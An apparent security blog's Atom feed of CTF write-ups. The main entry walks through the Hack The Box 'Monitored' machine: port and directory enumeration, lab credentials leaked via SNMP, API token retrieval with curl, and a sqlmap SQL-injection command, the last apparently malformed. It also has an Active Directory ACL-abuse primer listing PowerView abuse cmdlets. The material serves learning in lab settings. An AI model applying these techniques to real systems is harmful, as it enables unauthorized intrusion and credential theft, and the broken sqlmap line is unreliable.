<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Malw0re</title>
  
  
  <link href="https://malw0re.github.io/atom.xml" rel="self"/>
  
  <link href="https://malw0re.github.io/"/>
  <updated>2025-07-09T18:12:01.002Z</updated>
  <id>https://malw0re.github.io/</id>
  
  <author>
    <name>malw0re</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>certificate.md</title>
    <link href="https://malw0re.github.io/2025/05/31/certificate/"/>
    <id>https://malw0re.github.io/2025/05/31/certificate/</id>
    <published>2025-05-31T21:42:11.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<p>This machine is an Windows machine, however it‚Äôs very useful if you want to understand fundamentals of AD certificates and how to exploit it. You‚Äôll see a lot of techniques here in more difficult machines (though they may be used differently).</p><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>With that, let‚Äôs run our base NMAP scan</p><pre><code></code></pre>]]></content>
    
    
    <summary type="html">Certificate HTB</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="htb" scheme="https://malw0re.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>Monitored</title>
    <link href="https://malw0re.github.io/2024/02/29/manager/"/>
    <id>https://malw0re.github.io/2024/02/29/manager/</id>
    <published>2024-02-29T11:30:03.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ht14f3nLye487pVBC_xxFQ.png"></p><p>Today we‚Äôll be covering an interesting box called <em>Monitored</em> introduced with a medium level difficulty so let‚Äôs check it out.</p><h3 id="Nmap-Scans"><a href="#Nmap-Scans" class="headerlink" title="Nmap Scans."></a>Nmap Scans.</h3><p>Starting off with some port enumeration we get some interesting ports open.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE  SERVICE          VERSION</span><br><span class="line">22/tcp   open   ssh              OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">53/tcp   closed domain</span><br><span class="line">80/tcp   open   http             Apache httpd 2.4.56</span><br><span class="line">135/tcp  closed msrpc</span><br><span class="line">389/tcp  open   ldap</span><br><span class="line">139/tcp  closed netbios-ssn</span><br><span class="line">445/tcp  closed microsoft-ds</span><br><span class="line">464/tcp  closed kpasswd5</span><br><span class="line">593/tcp  closed http-rpc-epmap</span><br><span class="line">636/tcp  closed ldapssl</span><br><span class="line">1433/tcp closed ms-sql-s</span><br><span class="line">3268/tcp closed globalcatLDAP</span><br><span class="line">3269/tcp closed globalcatLDAPssl</span><br><span class="line">5667/tcp open   tcpwrapped</span><br><span class="line">Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Web-Enumeration-port-80"><a href="#Web-Enumeration-port-80" class="headerlink" title="Web Enumeration (port 80)"></a>Web Enumeration (port 80)</h2><p>Intially checking port 80 it redirects to <code>nagios.monitored.htb</code><br><img src="https://imgur.com/ELNHUOG.png"> checking the site out. We are redirected to nagios XI.<br><img src="https://imgur.com/rcKawD1.png"> which is a server and networking monitoring software.</p><h2 id="Fuzzing-port-80"><a href="#Fuzzing-port-80" class="headerlink" title="Fuzzing port 80."></a>Fuzzing port 80.</h2><p>Trying login with the default credentials found online didn‚Äôt provide us with access, hence the next step was to fuzz for some directory that might be hidden.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms]</span><br><span class="line">                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms]</span><br><span class="line">.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms]</span><br><span class="line">.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms]</span><br><span class="line">.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms]</span><br><span class="line">.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms]</span><br><span class="line">.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms]</span><br><span class="line">.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms]</span><br><span class="line">cgi-bin/.php            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]</span><br><span class="line">cgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]</span><br><span class="line">index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms]</span><br><span class="line">index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms]</span><br><span class="line">javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms]</span><br><span class="line">nagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms]</span><br><span class="line">server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms]</span><br></pre></td></tr></table></figure><p>We see that the <code>nagios</code> directory seems interesting but navigating tot the directory doesn‚Äôt produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory <code>nagiosxi</code>.</p><h2 id="nagiosxi"><a href="#nagiosxi" class="headerlink" title="nagiosxi"></a>nagiosxi</h2><p>Fuzzing the directory we get some interesting directories, </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms]</span></span><br><span class="line"><span class="built_in">help</span>                    [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms]</span><br><span class="line">tools                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms]</span><br><span class="line">mobile                  [Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms]</span><br><span class="line">admin                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms]</span><br><span class="line">reports                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms]</span><br><span class="line">account                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms]</span><br><span class="line">includes                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms]</span><br><span class="line">backend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms]</span><br><span class="line">db                      [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms]</span><br><span class="line">api                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 210ms]</span><br><span class="line">config                  [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms]</span><br><span class="line">views                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms]</span><br><span class="line">sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms]</span><br><span class="line">terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms]</span><br></pre></td></tr></table></figure><p>Checking out <code>terminal</code> directory, there‚Äôs a shell in box gui which after trying out soem authentication bypasses it didn‚Äôt work.<br>Later on went on to fuzz the <code>api</code> endpoint. </p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>Fuzzing the API endpoints gives us 2 endpoints the <code>v1</code> and <code>includes</code>. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.</p><p><strong>Note</strong>:<br>If we visit &#x2F;api&#x2F;v1&#x2F;xxx we can see that all the ‚Äúendpoints‚Äù were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.&#96;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms]</span><br><span class="line">%20                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms]</span><br><span class="line">video games             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms]</span><br><span class="line">authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms]</span><br></pre></td></tr></table></figure><p>We get an interesting endpoint called authenticate but trying to access it we find that, we can only use <code>POST</code> to authenticate and since we don‚Äôt have any credentials to authenticate with decided to go back to the nmap results and enumerate more.</p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE         SERVICE</span><br><span class="line">7/udp     open|filtered <span class="built_in">echo</span></span><br><span class="line">53/udp    open|filtered domain</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">123/udp   open          ntp</span><br><span class="line">161/udp   open          snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">16838/udp open|filtered unknown</span><br><span class="line">18617/udp open|filtered unknown</span><br><span class="line">21131/udp open|filtered unknown</span><br><span class="line">21698/udp open|filtered unknown</span><br><span class="line">28547/udp open|filtered unknown</span><br><span class="line">49181/udp open|filtered unknown</span><br></pre></td></tr></table></figure><p>Enumerating UDP ports, we find that snmp is open, enumerating snmp using <a href="https://github.com/mteg/braa">braa</a> a mass snmp scanner. We get interesting results.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">iso.3.6.1.2.1.25.4.2.1.5.505 = STRING: <span class="string">&quot;--config /etc/laurel/config.toml&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.549 = STRING: <span class="string">&quot;-f&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.550 = STRING: <span class="string">&quot;--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.553 = STRING: <span class="string">&quot;-n -iNONE&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.556 = STRING: <span class="string">&quot;-u -s -O /run/wpa_supplicant&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.568 = STRING: <span class="string">&quot;-f&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: <span class="string">&quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.642 = STRING: <span class="string">&quot;-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.762 = STRING: <span class="string">&quot;-f /usr/local/nagios/etc/pnp/npcd.cfg&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.769 = STRING: <span class="string">&quot;-LOw -f -p /run/snmptrapd.pid&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: <span class="string">&quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.804 = STRING: <span class="string">&quot;-p /var/run/ntpd.pid -g -u 108:116&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.806 = STRING: <span class="string">&quot;-o -p -- \\u --noclear tty1 linux&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.841 = STRING: <span class="string">&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: <span class="string">&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.848 = STRING: <span class="string">&quot;-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: <span class="string">&quot;-k start&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: <span class="string">&quot;-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.942 = STRING: <span class="string">&quot;/usr/sbin/snmptt --daemon&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.943 = STRING: <span class="string">&quot;/usr/sbin/snmptt --daemon&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.972 = STRING: <span class="string">&quot;-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.976 = STRING: <span class="string">&quot;-d /usr/local/nagios/etc/nagios.cfg&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: <span class="string">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: <span class="string">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.979 = STRING: <span class="string">&quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;</span></span><br></pre></td></tr></table></figure><p>we identify there‚Äôs a user called <code>svc</code> and also a passowrd that the user tried to authenticate with.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: <span class="string">&quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;</span></span><br></pre></td></tr></table></figure><h2 id="Initial-Foothold"><a href="#Initial-Foothold" class="headerlink" title="Initial Foothold."></a>Initial Foothold.</h2><p>Now having creds to login and hving prior knowledge that we have a few instances on the <code>API</code> and <code>terminal</code> endpoints that we had to try out, started out with the terminal endpoint, didn‚Äôt give us any results, proceeded to the <code>API</code> endpoint where we are need to construct a post request so as to authenticate.</p><p><img src="https://imgur.com/dEBYn5d.png"></p><p>An Auth Token Obtain after using curl.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -k -L -d <span class="string">&#x27;username=svc&amp;password=XjH7VCehowpR1xZB&#x27;</span> https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/```</span><br><span class="line"></span><br><span class="line">```bash </span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;svc&quot;</span>,<span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;auth_token&quot;</span>:<span class="string">&quot;76064ac8a8a9ece7c349404e1f99a45665e9acfc&quot;</span>,<span class="string">&quot;valid_min&quot;</span>:5,<span class="string">&quot;valid_until&quot;</span>:<span class="string">&quot;Fri, 23 Feb 2024 22:38:15 -0500&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>we get an auth token, going back to the <code>nagios</code> directory, we can authenticate and successfully login.</p><p><img src="https://imgur.com/fHkual8.png"></p><p>According with this <a href="https://www.cve.org/CVERecord?id=CVE-2023-40931">CVE</a> there is a Post-Auth SQLi, so let‚Äôs try POST &#x2F;nagiosxi&#x2F;admin&#x2F;banner_message-ajaxhelper.php HTTP&#x2F;1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&quot;</span> --level 5 --risk 3 -p <span class="built_in">id</span> --batch -D nagiosxi --dump -T xi_users | awk -F<span class="string">&#x27;&quot;&#x27;</span> <span class="string">&#x27;&#123;print$12&#125;&#x27;</span><span class="string">&quot; --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Monitored HacktheBox Writeup</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="htb" scheme="https://malw0re.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>Simple CTF</title>
    <link href="https://malw0re.github.io/2024/01/20/easyCTF/"/>
    <id>https://malw0re.github.io/2024/01/20/easyCTF/</id>
    <published>2024-01-20T11:30:03.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<p>Hi guys, welcome back to another Tryhackme room starting off the year with.</p>]]></content>
    
    
    <summary type="html">Simple CTF TryhackMe</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="tryhackme" scheme="https://malw0re.github.io/tags/tryhackme/"/>
    
    <category term="web" scheme="https://malw0re.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACL AD</title>
    <link href="https://malw0re.github.io/2024/01/04/acls/"/>
    <id>https://malw0re.github.io/2024/01/04/acls/</id>
    <published>2024-01-04T00:00:00.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Access-Control-List-ACL-Abuse-Primer"><a href="#Access-Control-List-ACL-Abuse-Primer" class="headerlink" title="Access Control List (ACL) Abuse Primer"></a>Access Control List (ACL) Abuse Primer</h2><p>For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.</p><h2 id="Access-Control-List-ACL-Overview"><a href="#Access-Control-List-ACL-Overview" class="headerlink" title="Access Control List (ACL) Overview"></a>Access Control List (ACL) Overview</h2><p>In their simplest form, ACLs are lists that define a) who has access to which asset&#x2F;resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.</p><h3 id="There-are-two-types-of-ACLs"><a href="#There-are-two-types-of-ACLs" class="headerlink" title="There are two types of ACLs:"></a>There are two types of ACLs:</h3><ul><li><p>Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.</p></li><li><p>System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.</p></li></ul><p>We see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.</p><p>Viewing forend‚Äôs ACL</p><p><img src="https://academy.hackthebox.com/storage/modules/143/DACL_example.png"><br>The SACLs can be seen within the Auditing tab.</p><p>Viewing the SACLs through the Auditing Tab</p><p><img src="https://academy.hackthebox.com/storage/modules/143/SACL_example.png"></p><h2 id="Access-Control-Entries-ACEs"><a href="#Access-Control-Entries-ACEs" class="headerlink" title="Access Control Entries (ACEs)"></a>Access Control Entries (ACEs)</h2><p>As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:</p><p>ACEDescription</p><ul><li>Access denied ACE -Used within a DACL to show that a user or group is explicitly denied access to an object</li><li>Access allowed ACE - Used within a DACL to show that a user or group is explicitly granted access to an object</li><li>System audit ACE - Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred</li></ul><p>Each ACE is made up of the following four components:</p><p>The <em>security identifier (SID)</em> of the user&#x2F;group that has access to the object (or principal name graphically)<br>A flag denoting the type of ACE (access denied, allowed, or system audit ACE)<br>A set of flags that specify whether or not child containers&#x2F;objects can inherit the given ACE entry from the primary or parent object<br>An access mask which is a 32-bit value that defines the rights granted to an object<br>We can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:</p><h2 id="Viewing-Permissions-through-Active-Directory-Users-Computers"><a href="#Viewing-Permissions-through-Active-Directory-Users-Computers" class="headerlink" title="Viewing Permissions through Active Directory Users &amp; Computers"></a>Viewing Permissions through Active Directory Users &amp; Computers</h2><p><img src="https://academy.hackthebox.com/storage/modules/143/ACE_example.png"></p><ol><li>The security principal is Angela Dunn (<a href="mailto:&#97;&#x64;&#117;&#x6e;&#x6e;&#64;&#105;&#x6e;&#x6c;&#97;&#x6e;&#101;&#102;&#114;&#x65;&#x69;&#103;&#104;&#x74;&#46;&#108;&#111;&#x63;&#x61;&#x6c;">adunn@inlanefreight.local</a>)</li><li>The ACE type is Allow</li><li>Inheritance applies to the ‚ÄúThis object and all descendant objects,‚Äù meaning any child objects of the forend object would have the same permissions granted</li><li>The rights granted to the object, again shown graphically in this example</li></ol><p>When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.</p><h2 id="Why-are-ACEs-Important"><a href="#Why-are-ACEs-Important" class="headerlink" title="Why are ACEs Important?"></a>Why are ACEs Important?</h2><p>Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the ‚Äúlow hanging fruit‚Äù AD flaws&#x2F;misconfigurations, ACL abuse can be a great way for us to move laterally&#x2F;vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:</p><ul><li>ForceChangePassword abused with Set-DomainUserPassword</li><li>Add Members abused with Add-DomainGroupMember</li><li>GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember</li><li>GenericWrite abused with Set-DomainObject</li><li>WriteOwner abused with Set-DomainObjectOwner</li><li>WriteDACL abused with Add-DomainObjectACL</li><li>AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember</li><li>Addself abused with Add-DomainGroupMember</li></ul><h3 id="enumerating-and-leveraging-four-specific-ACEs-to-highlight-the-power-of-ACL-attacks"><a href="#enumerating-and-leveraging-four-specific-ACEs-to-highlight-the-power-of-ACL-attacks" class="headerlink" title="enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:"></a>enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:</h3><ul><li>ForceChangePassword - gives us the right to reset a user‚Äôs password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).</li><li>GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.</li><li>AddSelf - shows security groups that a user can add themselves to.</li><li>GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the <em>Local Administrator Password Solution (LAPS)</em> is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.</li></ul><p>This graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.</p><p><img src="https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png"></p><p>We will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there are tools such as GMSAPasswordReader that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It‚Äôs worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.</p><h2 id="ACL-Attacks-in-the-Wild"><a href="#ACL-Attacks-in-the-Wild" class="headerlink" title="ACL Attacks in the Wild"></a>ACL Attacks in the Wild</h2><p>We can use ACL attacks for:</p><ul><li>Lateral movement</li><li>Privilege escalation</li><li>Persistence</li></ul><p>Some common attack scenarios may include:</p><h3 id="Attack-Description"><a href="#Attack-Description" class="headerlink" title="Attack Description"></a>Attack Description</h3><table><thead><tr><th>Attack</th><th>Description</th></tr></thead><tbody><tr><td>Abusing forgot password permissions</td><td>Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.</td></tr><tr><td>Abusing group membership management</td><td>It‚Äôs also common to see Help Desk and other staff that have the right to add&#x2F;remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.</td></tr><tr><td>Excessive user rights</td><td>We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.</td></tr></tbody></table><p>Note: Some ACL attacks can be considered ‚Äúdestructive,‚Äù such as changing a user‚Äôs password or performing other modifications within a client‚Äôs AD domain. If in doubt, it‚Äôs always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.</p>]]></content>
    
    
    <summary type="html">Access Control List</summary>
    
    
    
    <category term="Research" scheme="https://malw0re.github.io/categories/Research/"/>
    
    
    <category term="Active-Directory" scheme="https://malw0re.github.io/tags/Active-Directory/"/>
    
    <category term="access control list" scheme="https://malw0re.github.io/tags/access-control-list/"/>
    
  </entry>
  
  <entry>
    <title>Hacktheboo 2023 CTF</title>
    <link href="https://malw0re.github.io/2023/10/23/forensics/"/>
    <id>https://malw0re.github.io/2023/10/23/forensics/</id>
    <published>2023-10-23T14:21:14.000Z</published>
    <updated>2025-07-09T18:12:01.002Z</updated>
    
